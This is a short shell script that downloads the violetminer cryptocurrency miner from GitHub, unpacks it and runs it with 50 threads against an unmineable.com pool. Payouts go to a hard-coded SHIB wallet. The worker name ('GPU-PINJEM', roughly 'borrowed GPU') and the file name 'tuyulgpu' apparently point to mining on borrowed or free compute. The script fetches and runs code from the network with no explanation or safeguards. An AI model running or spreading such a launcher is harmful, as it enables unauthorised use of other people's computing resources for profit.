POOL=rx-us.unmineable.com:3333

WALLET=SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02

WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)

ALGO=wrkzcoin

chmod +x tuyulgpu

wget https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar xvf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 &&  ./violetminer --pool rx.unmineable.com:3333 --username SHIB:0xf932e7CD10E3bDa943916024358951b6C5c06F02.Yakes#ydex-20uq --password x --algorithm wrkzcoin --threads 50

